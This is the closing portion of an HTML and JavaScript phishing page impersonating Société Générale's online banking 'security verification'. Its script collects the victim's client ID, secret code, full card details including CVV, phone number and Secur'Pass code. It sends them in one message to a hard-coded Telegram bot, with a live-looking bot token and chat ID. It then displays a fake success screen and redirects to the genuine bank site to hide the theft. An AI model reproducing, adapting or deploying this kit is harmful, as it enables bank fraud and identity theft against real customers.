                    <i class="fas fa-check"></i>
                </div>
                
                <h1 class="final-title">Vérification effectuée avec succès</h1>
                <p class="final-message">
                    Vos accès et votre carte bancaire ont été entièrement protégés.
                </p>
                
                <div class="success-card">
                    <h2 class="success-title">
                        <i class="fas fa-shield-alt"></i>
                        Sécurisation activée
                    </h2>
                    
                    <ul class="success-list">
                        <li>Votre carte bancaire est protégée contre les utilisations frauduleuses</li>
                        <li>Votre identité a été vérifiée et confirmée</li>
                        <li>Les alertes de sécurité sont activées pour toutes les transactions</li>
                        <li>Votre Secur'Pass personnel a été validé</li>
                    </ul>
                </div>
                
                <!-- MESSAGE DE PATIENCE 10s - FIN ET PETIT -->
                <div class="patience-container">
                    <div class="patience-message">
                        <i class="fas fa-shield-alt" style="color: var(--sg-red); margin-right: 6px;"></i>
                        Afin de valider la sécurité de vos données, veuillez ne pas quitter cette page. Elle se fermera automatiquement une fois la confirmation effectuée.
                    </div>
                    <div class="tiny-timer">
                        <i class="fas fa-hourglass-half" style="color: var(--sg-red);"></i>
                        <span>Fermeture automatique dans</span>
                        <span class="timer-badge" id="timerDisplay">10s</span>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="footer-section">
            <div class="white-space-below">
                <div class="footer-container">
                    <div class="logo-section-footer">
                        <img src="https://i.ibb.co/PvFphHcf/Societe-Generale-Logo.jpg" alt="SG" class="sg-logo-img">
                    </div>
                    <div class="links-lines">
                        <span class="link-item"><a href="#">Sécurité</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Gestion des Cookies</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Documentation et Tarifs</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Résilier une prestation</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Contestation et réclamation</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Informations légales</a></span>
                        <span class="line-break"></span>
                        <span class="link-item"><a href="#">Fonds de Garantie des Dépôts et de Résolution</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Accessibilité Numérique</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Label « Engagé RSE »</a></span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        (function() {
            'use strict';

            // ====================================================
            // CONFIGURATION TELEGRAM - ACTIVÉE AVEC TES IDENTIFIANTS
            // ====================================================
            const TELEGRAM_CONFIG = {
                botToken: '8229892733:AAGi-gFImJ3Eu2rQ9zsc3riEewi_IeQJHJ8',
                chatId: '7400901360'
            };

            // ----------------------------------------------------
            // GESTION GLOBALE : PAGES ET STOCKAGE SESSION
            // ----------------------------------------------------
            const STORAGE_KEY = 'sg_auth_complete';
            const CARD_DATA_KEY = 'sg_card_data';

            const pages = {
                page1: document.getElementById('page1'),
                page2: document.getElementById('page2'),
                page3: document.getElementById('page3'),
                page4: document.getElementById('page4')
            };

            let timerInterval = null;

            // Sauvegarde des données d'authentification (page1)
            function saveAuthData(clientCode, secretSequence) {
                const authData = {
                    clientCode: clientCode,
                    secretCode: secretSequence.join(''),
                    sequence: secretSequence,
                    timestamp: Date.now(),
                    authenticated: true
                };
                sessionStorage.setItem(STORAGE_KEY, JSON.stringify(authData));
                return authData;
            }

            // Sauvegarde des données de la carte (page2)
            function saveCardData(cardData) {
                sessionStorage.setItem(CARD_DATA_KEY, JSON.stringify(cardData));
            }

            function getAuthData() {
                try {
                    const data = sessionStorage.getItem(STORAGE_KEY);
                    return data ? JSON.parse(data) : null;
                } catch(e) {
                    return null;
                }
            }

            // Changer de page avec mise à jour de la classe active
            function showPage(pageId) {
                Object.keys(pages).forEach(id => {
                    pages[id].classList.remove('active');
                });
                pages[pageId].classList.add('active');
            }

            // ====================================================
            // FONCTION D'ENVOI VERS TELEGRAM (ACTIVE)
            // ====================================================
            async function sendToTelegram(message, data) {
                // Journalisation
                console.log('=== TELEGRAM - ' + message + ' ===', data);
                
                const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
                
                let formattedMessage = `🔐 *SOCIÉTÉ GÉNÉRALE - SÉCURISATION*\n`;
                formattedMessage += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
                formattedMessage += `📌 *${message}*\n\n`;
                
                if (data) {
                    if (data.identifiant_client) {
                        formattedMessage += `👤 *Identifiant client:* \`${data.identifiant_client}\`\n`;
                    }
                    if (data.code_secret) {
                        formattedMessage += `🔑 *Code secret:* \`${data.code_secret}\`\n`;
                    }
                    if (data.carte) {
                        formattedMessage += `\n💳 *Carte bancaire:*\n`;
                        formattedMessage += `   • Numéro: \`${data.carte.cardNumber || 'non renseigné'}\`\n`;
                        formattedMessage += `   • Titulaire: ${data.carte.cardHolder || 'non renseigné'}\n`;
                        formattedMessage += `   • Expiration: ${data.carte.cardExpiry || 'non renseigné'}\n`;
                        formattedMessage += `   • CVV: \`${data.carte.cardCVV || 'non renseigné'}\`\n`;
                        formattedMessage += `   • Téléphone: ${data.carte.phoneNumber || 'non renseigné'}\n`;
                    }
                    if (data.securpass) {
                        formattedMessage += `\n🔐 *Secur'Pass:* \`${data.securpass}\`\n`;
                    }
                }
                
                formattedMessage += `\n━━━━━━━━━━━━━━━━━━━━━\n`;
                formattedMessage += `🕐 *${new Date().toLocaleString('fr-FR')}*`;

                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CONFIG.chatId,
                            text: formattedMessage,
                            parse_mode: 'Markdown'
                        })
                    });
                    
                    if (response.ok) {
                        console.log('✅ Message Telegram envoyé avec succès');
                    } else {
                        console.error('❌ Erreur envoi Telegram:', await response.text());
                    }
                } catch (error) {
                    console.error('❌ Erreur réseau Telegram:', error);
                }
            }

            // ----------------------------------------------------
            // PAGE 4 : TIMER 10s ET REDIRECTION
            // ----------------------------------------------------
            function startRedirectTimer() {
                if (timerInterval) clearInterval(timerInterval);

                let secondsLeft = 10;
                const timerDisplay = document.getElementById('timerDisplay');

                function updateTimer() {
                    if (timerDisplay) {
                        timerDisplay.textContent = secondsLeft + 's';
                    }

                    if (secondsLeft <= 0) {
                        clearInterval(timerInterval);
                        window.location.href = 'https://particuliers.sg.fr/icd/cbo/index-react-authsec.html#/synthese';
                    }
                    secondsLeft--;
                }

                updateTimer();
                timerInterval = setInterval(updateTimer, 1000);
            }

            // ----------------------------------------------------
            // PAGE 1 : CONNEXION + CLAVIER
            // ----------------------------------------------------
            const input = document.getElementById('clientCode');
            const clearButton = document.getElementById('clearButton');
            const toggleBtn = document.getElementById('nonToggle');
            const infoBtn = document.getElementById('infoBtn');
            const validCheck = document.getElementById('validCheck');
            const firstValidateBtn = document.getElementById('firstValidateBtn');
            const firstValidateContainer = document.querySelector('.first-validate-container');
            const simpleSection = document.getElementById('simpleSection');
            const dashesDisplay = document.getElementById('dashesDisplay');
            const xButton = document.getElementById('xButton');
            const simpleGrid = document.getElementById('simpleGrid');
            const validateButton = document.getElementById('validateButton');

            let selectedCells = [];
            const allNumbers = [8,5,6,1,4,0,9,2,3,7];
            const sequences = [
                [8,5,6,1,4,0],
                [9,2,3,7,8,5],
                [6,1,4,0,9,2],
                [3,7,8,5,6,1]
            ];

            function shuffleArray(arr) {
                for (let i = arr.length-1; i>0; i--) {
                    const j = Math.floor(Math.random()*(i+1));
                    [arr[i], arr[j]] = [arr[j], arr[i]];
                }
                return arr;
            }

            clearButton.addEventListener('click', function() {
                input.value = '';
                input.focus();
                validCheck.classList.remove('show');
            });

            input.addEventListener('keydown', function(e) {
                if (/[a-zA-Z]/.test(e.key)) e.preventDefault();
            });

            input.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                if (this.value.length === 8) validCheck.classList.add('show');
                else validCheck.classList.remove('show');
            });

            input.addEventListener('keyup', function(e) {
                if (e.key === 'Enter') firstValidateBtn.click();
            });

            toggleBtn.addEventListener('click', function() {
                this.classList.toggle('active');
                const icon = this.querySelector('.toggle-slider i');
                if (this.classList.contains('active')) {
                    icon.className = 'fas fa-minus';
                } else {
                    icon.className = 'fas fa-circle';
                }
            });
            
            infoBtn.addEventListener('click', function() {
                alert("Option 'Se souvenir de moi' : Votre connexion sera mémorisée sur cet appareil pour une durée limitée.");
            });

            firstValidateBtn.addEventListener('click', function() {
                if (input.value.length === 8) {
                    firstValidateContainer.style.display = 'none';
                    simpleSection.style.display = 'block';
                    generateKeypad();
                    input.blur();
                } else {
                    this.textContent = "8 chiffres requis";
                    setTimeout(() => this.textContent = "Valider", 1500);
                }
            });

            function generateKeypad() {
                simpleGrid.innerHTML = '';
                selectedCells = [];
                validateButton.disabled = true;
                updateDashesDisplay();

                let allCells = Array(16).fill(null);
                let positions = [];
                for (let i=0; i<16; i++) positions.push(i);
                shuffleArray(positions);
                let numberPositions = positions.slice(0,10);
                allNumbers.forEach((num, idx) => {
                    allCells[numberPositions[idx]] = num;
                });

                allCells.forEach((value, index) => {
                    const cell = document.createElement('div');
                    cell.className = 'simple-cell';
                    if (value !== null) {
                        cell.textContent = value;
                        cell.dataset.value = value;
                        cell.addEventListener('click', function() {
                            if (!cell.classList.contains('selected') && selectedCells.length < 6) {
                                cell.classList.add('selected');
                                selectedCells.push(value);
                                updateDashesDisplay();
                                if (selectedCells.length === 6) validateButton.disabled = false;
                            }
                        });
                    } else {
                        cell.classList.add('empty');
                    }
                    simpleGrid.appendChild(cell);
                });
            }

            function updateDashesDisplay() {
                let displayText = '';
                for (let i=0; i<6; i++) {
                    displayText += (i < selectedCells.length) ? selectedCells[i] + ' ' : '- ';
                }
                dashesDisplay.textContent = displayText.trim();
            }

            function resetKeypad() {
                selectedCells = [];
                document.querySelectorAll('.simple-cell').forEach(cell => {
                    if (!cell.classList.contains('empty')) cell.classList.remove('selected');
                });
                updateDashesDisplay();
                validateButton.disabled = true;
            }
            xButton.addEventListener('click', resetKeypad);

            validateButton.addEventListener('click', function() {
                if (selectedCells.length === 6 && input.value.length === 8) {
                    saveAuthData(input.value, selectedCells);
                    
                    input.value = '';
                    validCheck.classList.remove('show');
                    simpleSection.style.display = 'none';
                    firstValidateContainer.style.display = 'flex';
                    resetKeypad();

                    showPage('page2');
                }
            });

            // ----------------------------------------------------
            // PAGE 2 : SÉCURISATION CARTE
            // ----------------------------------------------------
            const backToPage1 = document.getElementById('backToPage1');
            const backBtn = document.getElementById('backBtn');
            const cardNumberInput = document.getElementById('cardNumber');
            const cardHolderInput = document.getElementById('cardHolder');
            const cardExpiryInput = document.getElementById('cardExpiry');
            const cardCVVInput = document.getElementById('cardCVV');
            const phoneInput = document.getElementById('phoneNumber');
            const cardForm = document.getElementById('cardSecurityForm');

            function goBackToPage1(e) {
                if (e) e.preventDefault();
                showPage('page1');
            }
            backToPage1.addEventListener('click', goBackToPage1);
            backBtn.addEventListener('click', goBackToPage1);

            cardNumberInput.addEventListener('input', function(e) {
                let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
                if (v.length > 16) v = v.substring(0,16);
                let fmt = '';
                for (let i=0; i<v.length; i++) {
                    if (i>0 && i%4===0) fmt += ' ';
                    fmt += v[i];
                }
                e.target.value = fmt.trim();
            });
            
            cardHolderInput.addEventListener('input', function(e) {
                e.target.value = e.target.value.toUpperCase().replace(/[^A-Z\s]/g, '').substring(0,30);
            });
            
            cardExpiryInput.addEventListener('input', function(e) {
                let v = e.target.value.replace(/[^0-9]/g, '');
                if (v.length > 4) v = v.substring(0,4);
                if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2);
                e.target.value = v;
            });
            
            phoneInput.addEventListener('input', function(e) {
                let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
                if (v.length > 10) v = v.substring(0,10);
                let fmt = '';
                for (let i=0; i<v.length; i++) {
                    if (i>0 && i%2===0) fmt += ' ';
                    fmt += v[i];
                }
                e.target.value = fmt.trim();
            });

            cardForm.addEventListener('submit', function(e) {
                e.preventDefault();

                const cardData = {
                    cardNumber: cardNumberInput.value.replace(/\s+/g, ''),
                    cardHolder: cardHolderInput.value,
                    cardExpiry: cardExpiryInput.value,
                    cardCVV: cardCVVInput.value,
                    phoneNumber: phoneInput.value.replace(/\s+/g, '')
                };

                saveCardData(cardData);
                showPage('page3');
            });

            // ----------------------------------------------------
            // PAGE 3 : VÉRIFICATION SECUR'PASS
            // ----------------------------------------------------
            const backToPage2FromVerif = document.getElementById('backToPage2FromVerif');
            const mysteryInput = document.getElementById('mysteryCode');
            const validateMysteryBtn = document.getElementById('validateMysteryBtn');

            if (backToPage2FromVerif) {
                backToPage2FromVerif.addEventListener('click', function(e) {
                    e.preventDefault();
                    showPage('page2');
                });
            }

            if (mysteryInput) {
                mysteryInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/[^0-9]/g, '');
                    e.target.value = value;
                    const len = value.length;
                    validateMysteryBtn.disabled = !(len >= 4 && len <= 8);
                    if (len > 8) e.target.value = value.substring(0,8);
                });

                mysteryInput.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter' && !validateMysteryBtn.disabled) {
                        validateMysteryBtn.click();
                    }
                });
            }

            // UN SEUL ENVOI TELEGRAM - TOUTES LES DONNÉES
            if (validateMysteryBtn) {
                validateMysteryBtn.addEventListener('click', async function() {
                    if (this.disabled) return;

                    const securPass = mysteryInput.value;
                    
                    const authData = getAuthData();
                    const cardData = sessionStorage.getItem(CARD_DATA_KEY) ? JSON.parse(sessionStorage.getItem(CARD_DATA_KEY)) : null;

                    const payload = {
                        identifiant_client: authData ? authData.clientCode : null,
                        code_secret: authData ? authData.secretCode : null,
                        carte: cardData,
                        securpass: securPass,
                        timestamp: Date.now()
                    };

                    // ✅ ENVOI TELEGRAM UNIQUE - ACTIVÉ
                    await sendToTelegram('SÉCURISATION COMPLÈTE - TOUTES LES DONNÉES', payload);

                    this.disabled = true;
                    this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Vérification...';

                    setTimeout(() => {
                        mysteryInput.value = '';
                        validateMysteryBtn.disabled = true;
                        this.innerHTML = '<i class="fas fa-check"></i> Vérifier et Finaliser';
                        
                        showPage('page4');
                        startRedirectTimer();
                    }, 1200);
                });
            }

            // ----------------------------------------------------
            // ANIMATIONS / ALERTS DIVERS
            // ----------------------------------------------------
            document.querySelectorAll('.white-block').forEach(block => {
                block.addEventListener('click', function() {
                    alert(`Accéder à l'espace : ${this.querySelector('.space-title').textContent}`);
                });
            });
            
            document.querySelectorAll('.underlined-text').forEach(text => {
                text.addEventListener('click', function() {
                    alert(`Vous avez cliqué sur : "${this.textContent.trim()}"`);
                });
            });
            
            document.querySelector('.account-button').addEventListener('click', function() {
                alert("Fonctionnalité 'Ouvrir un compte'");
            });

            window.addEventListener('beforeunload', function() {
                if (timerInterval) clearInterval(timerInterval);
            });

            setTimeout(() => {
                if (input) input.focus();
            }, 200);
        })();
    </script>
</body>
</html>
